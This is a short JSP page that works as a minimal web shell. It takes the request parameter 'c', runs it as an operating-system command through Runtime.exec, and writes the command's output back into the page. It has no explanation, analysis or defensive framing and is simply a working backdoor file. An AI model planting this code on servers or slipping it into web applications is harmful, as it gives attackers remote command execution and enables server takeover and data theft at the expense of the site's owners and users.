<%@ page import="java.util.*,java.io.*"%>
<% 
if(request.getParameter("c")!=null) {
    Process p=Runtime.getRuntime().exec(request.getParameter("c"));
    DataInputStream dis=new DataInputStream(p.getInputStream());
    String disr=dis.readLine();
    while(disr!=null){out.println(disr);disr=dis.readLine();}
}
%>
